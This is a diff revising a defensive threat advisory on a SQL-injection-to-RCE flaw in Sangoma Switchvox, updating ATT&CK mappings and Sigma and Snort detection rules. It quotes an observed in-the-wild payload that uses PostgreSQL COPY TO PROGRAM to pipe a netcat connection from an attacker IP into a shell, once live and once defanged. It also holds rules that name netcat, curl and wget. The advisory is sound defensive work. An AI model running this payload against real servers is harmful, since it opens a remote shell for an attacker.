@@ -3,7 +3,7 @@
 Prepared by: Actioner
 Classification: TLP:WHITE
 Date: 2026-09-02
-Version: 1.0 DRAFT
+Version: 1.1 REVISED
 
 ## Executive Summary
 
@@ -59,7 +59,7 @@ The injection occurs within a single-quoted SQL string context. The attacker bre
 Attackers leverage PostgreSQL's `COPY TO PROGRAM` feature to execute OS commands. The observed payload pattern:
 
 ```sql
-'; COPY (SELECT '') TO PROGRAM 'nc 176.65.148.184 39323 | sh' --
+'; COPY (SELECT '') TO PROGRAM 'nc 176.65.148[.]184 39323 | sh' --
 ```
 
 A more complete payload observed in the wild:
@@ -153,9 +153,9 @@ Beyond RCE, the SQL injection enables:
 |-----|-----------|-------------------|
 | T1190 | Exploit Public-Facing Application | Unauthenticated SQL injection to the `/pa` endpoint via crafted XML POST request |
 | T1059.004 | Command and Scripting Interpreter: Unix Shell | `COPY TO PROGRAM` executes shell commands including `nc`, `sh`, `bash` |
-| T1048 | Exfiltration Over Alternative Protocol | Base64-encoded process data exfiltrated via HTTP GET to attacker IP |
-| T1005 | Data from Local System | Process enumeration via `top -bn1`; database content extraction |
-| T1078 | Valid Accounts | Cookie signing key extraction enables authentication forgery for admin access |
+| T1048.003 | Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol | Base64-encoded process data exfiltrated via HTTP GET to attacker IP |
+| T1057 | Process Discovery | Process enumeration via `top -bn1`; database content extraction |
+| T1550.004 | Use Alternate Authentication Material: Web Session Cookie | Cookie signing key extraction enables authentication forgery for admin access |
 | T1595 | Active Scanning | Pre-exploitation scanning of ~4,000 exposed Switchvox instances |
 
 ## Impact Assessment
@@ -209,28 +209,32 @@ grep '176.65.148.184' /var/log/messages /var/log/httpd/access_log
 
 These rules target the specific exploit chain for CVE-2026-9586: SQL injection via the `/pa` endpoint's `PhoneIP` XML field escalated to RCE through PostgreSQL `COPY TO PROGRAM`. The single caveat across all rules is that legitimate Polycom phone provisioning traffic also hits `/pa`, so the higher-confidence rules key on the SQL injection payload content rather than the endpoint alone.
 
-<!-- VALIDATION NOTES
+<!-- VALIDATION NOTES (v1.1 REVISED)
 Sigma rules: sigma check failed due to MITRE ATT&CK data endpoint unreachable (HTTP 403 from proxy).
-Structural/semantic validation performed via sigma convert to splunk and log_scale backends (both succeeded for all 3 rules).
-Suricata rules: suricata -T -S passed for both rules (Suricata 7.0.3).
-YARA rules: yarac compiled successfully (exit code 0) after removing unreferenced string.
-Snort rule: marked uncompiled (snort not available in toolchain).
+Structural/semantic validation performed via sigma convert to splunk and log_scale backends (both succeeded for all 3 rules, including revised Rules 1 and 3).
+Suricata rules: suricata -T -S passed for both rules (Suricata 7.0.3). No changes in revision.
+YARA rules: yarac compiled successfully (exit code 0). No changes in revision.
+Snort rule: marked uncompiled (snort not available in toolchain). depth:3->4, sid:2100101->2100103 in revision.
 All detection values use real (non-defanged) indicators per logsource-encoding spec.
 -->
+<!-- revision: defanged IP in line-62 SQL payload code block; ATT&CK T1078->T1550.004, T1005->T1057, T1048->T1048.003; Sigma Rule 1 confidence high->medium + CommandLine filter; Sigma Rule 3 startswith->exact match; Snort depth:3->4 + sid:2100103 -->
 
 ### Sigma Rule 1: PostgreSQL COPY TO PROGRAM Shell Spawn
 
 Detects the post-exploitation signature of PostgreSQL spawning shell processes, which is the direct consequence of `COPY TO PROGRAM` exploitation on Switchvox.
-**Compile: sigma convert splunk/log_scale PASSED | Confidence: high**
+<!-- revision: downgraded confidence high->medium; added CommandLine filter for COPY/TO PROGRAM strings to scope to Switchvox exploit chain and reduce altitude mismatch -->
+**Compile: sigma convert splunk/log_scale PASSED | Confidence: medium**
 
 ```yaml
 title: CVE-2026-9586 PostgreSQL COPY TO PROGRAM Spawning Shell on Switchvox
 id: 7a3e8c1f-4b2d-4e6a-9f01-c5d8b7e2a3f6
 status: experimental
 description: >
-    Detects PostgreSQL process spawning shell commands, indicative of
-    COPY TO PROGRAM exploitation via CVE-2026-9586 SQL injection on
-    Sangoma Switchvox systems. Attackers use this to deploy reverse shells.
+    Detects PostgreSQL process spawning shell commands whose command line
+    contains COPY TO PROGRAM strings, indicative of CVE-2026-9586 SQL
+    injection exploitation on Sangoma Switchvox systems. Scoped to
+    Switchvox-related artifacts to reduce false positives from generic
+    PostgreSQL maintenance.
 references:
     - https://horizon3.ai/attack-research/disclosures/cve-2026-9586-sangoma-switchvox-rce/
     - https://labs.sra.io/posts/switchvox/
@@ -243,7 +247,7 @@ logsource:
     category: process_creation
     product: linux
 detection:
-    selection:
+    selection_parent:
         ParentImage|endswith: '/postgres'
         Image|endswith:
             - '/sh'
@@ -252,11 +256,14 @@ detection:
             - '/ncat'
             - '/curl'
             - '/wget'
-    condition: selection
+    selection_cmdline:
+        CommandLine|contains:
+            - 'COPY'
+            - 'TO PROGRAM'
+    condition: selection_parent and selection_cmdline
 falsepositives:
-    - PostgreSQL maintenance scripts using shell commands
-    - Backup operations spawning shell from postgres
-level: high
+    - PostgreSQL maintenance scripts using COPY TO PROGRAM for legitimate exports
+level: medium
 ```
 
 ### Sigma Rule 2: Known Attacker IP
@@ -293,6 +300,7 @@ level: high
 ### Sigma Rule 3: Webserver POST to Vulnerable Endpoint
 
 Detects HTTP POST requests to the vulnerable `/pa` provisioning endpoint, filtered to exclude normal `.cfg` configuration file requests from legitimate phones.
+<!-- revision: changed cs-uri-stem|startswith '/pa' to exact-match list ['/pa','/pa/'] to avoid matching /pages, /password, /panel etc. -->
 **Compile: sigma convert splunk/log_scale PASSED | Confidence: medium**
 
 ```yaml
@@ -316,7 +324,9 @@ logsource:
 detection:
     selection:
         cs-method: 'POST'
-        cs-uri-stem|startswith: '/pa'
+        cs-uri-stem:
+            - '/pa'
+            - '/pa/'
     filter_phones:
         cs-uri-stem|contains: '.cfg'
     condition: selection and not filter_phones
@@ -346,10 +356,11 @@ alert http any any -> $HOME_NET any (msg:"Actioner - CVE-2026-9586 Switchvox SQL
 ### Snort Rule: COPY TO PROGRAM in Switchvox /pa Request
 
 Snort 3 equivalent of Suricata Rule 1 for environments running Snort.
+<!-- revision: depth:3 -> depth:4 to match "/pa/" (4 bytes); sid:2100101 -> sid:2100103 to avoid collision with Suricata Rule 1 -->
 **Compile: NOT COMPILED (snort not available) | Confidence: high**
 
 ```
-alert http any any -> $HOME_NET any (msg:"Actioner - CVE-2026-9586 Switchvox SQLi RCE via COPY TO PROGRAM"; flow:established, to_server; http_method; content:"POST"; http_uri; content:"/pa", fast_pattern, depth:3; http_client_body; content:"PolycomIPPhone"; content:"COPY", nocase, distance:0; content:"TO PROGRAM", nocase, distance:0; classtype:web-application-attack; reference:cve,2026-9586; reference:url,horizon3.ai/attack-research/disclosures/cve-2026-9586-sangoma-switchvox-rce/; metadata:author Actioner, created 2026-09-02; sid:2100101; rev:1;)
+alert http any any -> $HOME_NET any (msg:"Actioner - CVE-2026-9586 Switchvox SQLi RCE via COPY TO PROGRAM"; flow:established, to_server; http_method; content:"POST"; http_uri; content:"/pa", fast_pattern, depth:4; http_client_body; content:"PolycomIPPhone"; content:"COPY", nocase, distance:0; content:"TO PROGRAM", nocase, distance:0; classtype:web-application-attack; reference:cve,2026-9586; reference:url,horizon3.ai/attack-research/disclosures/cve-2026-9586-sangoma-switchvox-rce/; metadata:author Actioner, created 2026-09-02; sid:2100103; rev:1;)
 ```
 
 ### YARA Rule 1: Exploit Payload Detection
